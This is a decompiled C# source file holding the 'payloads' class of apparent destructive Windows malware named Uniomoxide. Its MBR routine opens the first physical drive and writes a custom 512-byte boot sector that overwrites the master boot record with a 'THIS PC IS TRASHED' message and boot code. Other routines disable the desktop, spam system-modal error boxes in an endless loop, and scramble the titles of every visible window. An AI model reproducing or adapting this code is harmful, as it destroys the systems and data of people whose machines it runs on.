using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Uniomoxide
{
	// Token: 0x0200000C RID: 12
	internal class payloads
	{
		// Token: 0x0600005B RID: 91
		[DllImport("user32.dll")]
		public static extern bool SetCursorPos(int x, int y);

		// Token: 0x0600005C RID: 92
		[DllImport("user32.dll")]
		public static extern bool BlockInput(bool fBlockIt);

		// Token: 0x0600005D RID: 93
		[DllImport("user32.dll")]
		public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

		// Token: 0x0600005E RID: 94
		[DllImport("user32.dll")]
		public static extern bool EnumWindows(payloads.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x0600005F RID: 95
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x06000060 RID: 96
		[DllImport("user32.dll")]
		private static extern bool EnumChildWindows(IntPtr hWndParent, payloads.EnumChildProc lpEnumFunc, IntPtr lParam);

		// Token: 0x06000061 RID: 97
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLength(IntPtr hWnd);

		// Token: 0x06000062 RID: 98
		[DllImport("user32.dll")]
		private static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000063 RID: 99
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

		// Token: 0x06000064 RID: 100
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000065 RID: 101
		[DllImport("user32.dll")]
		public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

		// Token: 0x06000066 RID: 102
		[DllImport("user32.dll")]
		private static extern int GetWindowTextLengthW(IntPtr hWnd);

		// Token: 0x06000067 RID: 103
		[DllImport("user32.dll")]
		private static extern int EnableWindow(IntPtr hWnd, bool bEnable);

		// Token: 0x06000068 RID: 104
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x06000069 RID: 105
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

		// Token: 0x0600006A RID: 106
		[DllImport("user32.dll")]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);

		// Token: 0x0600006B RID: 107
		[DllImport("user32.dll")]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x0600006C RID: 108
		[DllImport("kernel32.dll")]
		private static extern uint GetCurrentThreadId();

		// Token: 0x0600006D RID: 109
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowLongPtrW(IntPtr hWnd, int nIndex);

		// Token: 0x0600006E RID: 110
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowLongPtrW(IntPtr hWnd, int nIndex, IntPtr dwNewLong);

		// Token: 0x0600006F RID: 111
		[DllImport("user32.dll")]
		private static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000070 RID: 112
		[DllImport("user32.dll", CharSet = CharSet.Unicode)]
		private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, int uType);

		// Token: 0x06000071 RID: 113
		[DllImport("user32.dll")]
		private static extern IntPtr CreateSolidBrush(uint crColor);

		// Token: 0x06000072 RID: 114
		[DllImport("user32.dll")]
		private static extern int FillRect(IntPtr hDC, ref payloads.RECT lprc, IntPtr hbr);

		// Token: 0x06000073 RID: 115
		[DllImport("user32.dll")]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000074 RID: 116
		[DllImport("user32.dll")]
		private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000075 RID: 117
		[DllImport("user32.dll")]
		private static extern bool GetClientRect(IntPtr hWnd, out payloads.RECT lpRect);

		// Token: 0x06000076 RID: 118
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowsHookExW(int idHook, payloads.HookProc lpfn, IntPtr hMod, uint dwThreadId);

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000077 RID: 119 RVA: 0x000047F4 File Offset: 0x000029F4
		public static string unicode
		{
			get
			{
				StringBuilder stringBuilder = new StringBuilder();
				for (int i = 0; i < amount; i++)
				{
					int num;
					do
					{
						num = payloads.r.Next(32, 255);
					}
					while (char.IsControl((char)num));
					stringBuilder.Append(char.ConvertFromUtf32(num));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x06000078 RID: 120 RVA: 0x00002326 File Offset: 0x00000526
		public static void randomize_window_titles()
		{
			payloads.EnumWindows(delegate(IntPtr hWnd, IntPtr lParam)
			{
				if (payloads.IsWindowVisible(hWnd))
				{
					int windowTextLength = payloads.GetWindowTextLength(hWnd);
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					payloads.GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
					string text = stringBuilder.ToString();
					if (!string.IsNullOrEmpty(text))
					{
						payloads.SetWindowTextW(hWnd, payloads.get_unicode(payloads.r.Next(5, 20)));
					}
				}
				return true;
			}, IntPtr.Zero);
		}

		// Token: 0x06000079 RID: 121 RVA: 0x00004848 File Offset: 0x00002A48
		public static void randomize_desktop()
		{
			IntPtr desktopWindow = payloads.GetDesktopWindow();
			payloads.EnumChildWindows(desktopWindow, delegate(IntPtr hWnd, IntPtr lParam)
			{
				if (payloads.IsWindowVisible(hWnd))
				{
					int windowTextLength = payloads.GetWindowTextLength(hWnd);
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					payloads.GetWindowTextW(hWnd, stringBuilder, stringBuilder.Capacity);
					string text = stringBuilder.ToString();
					if (!string.IsNullOrEmpty(text))
					{
						payloads.SetWindowTextW(hWnd, payloads.get_unicode(payloads.r.Next(5, 20)));
					}
				}
				return true;
			}, IntPtr.Zero);
		}

		// Token: 0x0600007A RID: 122 RVA: 0x00004888 File Offset: 0x00002A88
		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			IntPtr intPtr;
			if (nCode == 5)
			{
				payloads.wnd = new payloads.WndProc(payloads.SubclassProc);
				payloads.oldProc = payloads.GetWindowLongPtrW(wParam, -4);
				payloads.SetWindowLongPtrW(wParam, -4, Marshal.GetFunctionPointerForDelegate(payloads.wnd));
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = payloads.CallNextHookEx(payloads.hHook, nCode, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x0600007B RID: 123 RVA: 0x000048E8 File Offset: 0x00002AE8
		private static IntPtr SubclassProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			IntPtr intPtr;
			if (msg == 15U)
			{
				IntPtr dc = payloads.GetDC(hWnd);
				payloads.RECT rect;
				payloads.GetClientRect(hWnd, out rect);
				IntPtr dc2 = payloads.GetDC(hWnd);
				payloads.FillRect(dc, ref rect, dc2);
				payloads.ReleaseDC(hWnd, dc);
				intPtr = IntPtr.Zero;
			}
			else
			{
				intPtr = payloads.CallWindowProc(payloads.oldProc, hWnd, msg, wParam, lParam);
			}
			return intPtr;
		}

		// Token: 0x0600007C RID: 124 RVA: 0x00004940 File Offset: 0x00002B40
		public static void Unknownerror()
		{
			IntPtr desktopWindow = payloads.GetDesktopWindow();
			payloads.EnableWindow(desktopWindow, false);
			payloads.hook = new payloads.HookProc(payloads.HookCallback);
			for (;;)
			{
				payloads.hHook = payloads.SetWindowsHookExW(5, payloads.hook, IntPtr.Zero, payloads.GetCurrentThreadId());
				string text = payloads.get_unicode(100);
				string text2 = payloads.get_unicode(20);
				payloads.UnhookWindowsHookEx(payloads.hHook);
				payloads.MessageBoxW(IntPtr.Zero, text, text2, 4112);
			}
		}

		// Token: 0x0600007D RID: 125 RVA: 0x000049B4 File Offset: 0x00002BB4
		public static void Unknownerror2()
		{
			IntPtr desktopWindow = payloads.GetDesktopWindow();
			payloads.EnableWindow(desktopWindow, false);
			payloads.hook = new payloads.HookProc(payloads.HookCallback);
			for (;;)
			{
				payloads.hHook = payloads.SetWindowsHookExW(5, payloads.hook, IntPtr.Zero, payloads.GetCurrentThreadId());
				string text = payloads.get_unicode2(20);
				string text2 = payloads.get_unicode2(20);
				payloads.MessageBoxW(IntPtr.Zero, text, text2, 4112);
				payloads.UnhookWindowsHookEx(payloads.hHook);
			}
		}

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600007E RID: 126 RVA: 0x00004A28 File Offset: 0x00002C28
		private static string unicode2
		{
			get
			{
				StringBuilder stringBuilder = new StringBuilder(len);
				for (int i = 0; i < len; i++)
				{
					stringBuilder.Append((char)(19968 + i % 200));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00004A68 File Offset: 0x00002C68
		public static void EnumAndMatch(IntPtr parent)
		{
			string target = payloads.get_unicode2(100);
			payloads.EnumChildWindows(parent, delegate(IntPtr hwnd, IntPtr l)
			{
				int windowTextLengthW = payloads.GetWindowTextLengthW(hwnd);
				if (windowTextLengthW > 0)
				{
					StringBuilder stringBuilder = new StringBuilder(windowTextLengthW + 1);
					payloads.GetWindowTextW(hwnd, stringBuilder, stringBuilder.Capacity);
					string text = stringBuilder.ToString();
					if (text == target)
					{
						Console.WriteLine(hwnd);
					}
				}
				return true;
			}, IntPtr.Zero);
		}

		// Token: 0x06000080 RID: 128 RVA: 0x00004AA0 File Offset: 0x00002CA0
		public static void MBR()
		{
			byte[] array = new byte[]
			{
				235, 49, 1, 0, 0, 0, 84, 72, 73, 83,
				32, 80, 67, 32, 73, 83, 32, 84, 82, 65,
				83, 72, 69, 68, 32, 66, 89, 32, 85, 78,
				73, 79, 77, 79, 88, 73, 68, 69, 32, 69,
				110, 106, 111, 121, 32, 40, 58, 0, 0, 0,
				0, 250, 49, 192, 142, 216, 142, 192, 142, 208,
				188, 0, 124, 251, 184, 19, 0, 205, 16, 180,
				0, 205, 26, 137, 22, 4, 124, 137, 22, 2,
				124, 184, 0, 160, 142, 192, 49, byte.MaxValue, 185, 0,
				250, 232, 128, 0, 136, 224, 170, 226, 248, 180,
				0, 205, 26, 137, 208, 43, 6, 4, 124, 131,
				248, 54, 114, 223, 184, 0, 160, 142, 192, 49,
				byte.MaxValue, 176, 13, 185, 0, 250, 243, 170, 190, 6,
				124, 232, 88, 0, 161, 2, 124, 131, 224, 15,
				116, 0, 162, 48, 124, 232, 74, 0, 161, 2,
				124, 49, 210, 185, 64, 1, 247, 241, 193, 234,
				3, 136, 22, 49, 124, 232, 54, 0, 161, 2,
				124, 49, 210, 185, 200, 0, 247, 241, 193, 234,
				3, 136, 22, 50, 124, 180, 2, 183, 0, 138,
				54, 50, 124, 138, 22, 49, 124, 205, 16, 180,
				14, 183, 0, 138, 30, 48, 124, 137, 247, 138,
				5, 60, 0, 116, 5, 205, 16, 71, 235, 245,
				235, 162, 161, 2, 124, 186, 53, 78, 247, 226,
				5, 90, 1, 163, 2, 124, 195, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr intPtr = payloads.CreateFile("\\\\.\\PhysicalDrive0", 268435456U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
			uint num;
			payloads.WriteFile(intPtr, array, 512U, out num, IntPtr.Zero);
		}

		// Token: 0x04000045 RID: 69
		public static Random r = new Random();

		// Token: 0x04000046 RID: 70
		private const uint MOUSEEVENTF_LEFTDOWN = 2U;

		// Token: 0x04000047 RID: 71
		private const uint MOUSEEVENTF_LEFTUP = 4U;

		// Token: 0x04000048 RID: 72
		private const uint MOUSEEVENTF_RIGHTDOWN = 8U;

		// Token: 0x04000049 RID: 73
		private const uint MOUSEEVENTF_RIGHTUP = 16U;

		// Token: 0x0400004A RID: 74
		private const uint GenericRead = 2147483648U;

		// Token: 0x0400004B RID: 75
		private const uint GenericWrite = 1073741824U;

		// Token: 0x0400004C RID: 76
		private const uint GenericExecute = 536870912U;

		// Token: 0x0400004D RID: 77
		private const uint GenericAll = 268435456U;

		// Token: 0x0400004E RID: 78
		private const uint FileShareRead = 1U;

		// Token: 0x0400004F RID: 79
		private const uint FileShareWrite = 2U;

		// Token: 0x04000050 RID: 80
		private const uint OpenExisting = 3U;

		// Token: 0x04000051 RID: 81
		private const uint FileFlagDeleteOnClose = 1073741824U;

		// Token: 0x04000052 RID: 82
		private const uint MbrSize = 512U;

		// Token: 0x04000053 RID: 83
		private const int WH_CBT = 5;

		// Token: 0x04000054 RID: 84
		private const int HCBT_ACTIVATE = 5;

		// Token: 0x04000055 RID: 85
		private const int WM_PAINT = 15;

		// Token: 0x04000056 RID: 86
		private const int GWL_WNDPROC = -4;

		// Token: 0x04000057 RID: 87
		private const int MB_ICONERROR = 16;

		// Token: 0x04000058 RID: 88
		private const int MB_SYSTEMMODAL = 4096;

		// Token: 0x04000059 RID: 89
		private static IntPtr hHook;

		// Token: 0x0400005A RID: 90
		private static payloads.HookProc hook;

		// Token: 0x0400005B RID: 91
		private static payloads.WndProc wnd;

		// Token: 0x0400005C RID: 92
		private static IntPtr oldProc;

		// Token: 0x0400005D RID: 93
		private static Random rnd = new Random();

		// Token: 0x0200001D RID: 29
		// (Invoke) Token: 0x0600009D RID: 157
		private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

		// Token: 0x0200001E RID: 30
		// (Invoke) Token: 0x060000A1 RID: 161
		public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

		// Token: 0x0200001F RID: 31
		// (Invoke) Token: 0x060000A5 RID: 165
		private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		// Token: 0x02000020 RID: 32
		// (Invoke) Token: 0x060000A9 RID: 169
		private delegate IntPtr WndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x02000021 RID: 33
		private struct RECT
		{
			// Token: 0x0400009C RID: 156
			public int left;

			// Token: 0x0400009D RID: 157
			public int top;

			// Token: 0x0400009E RID: 158
			public int right;

			// Token: 0x0400009F RID: 159
			public int bottom;
		}
	}
}
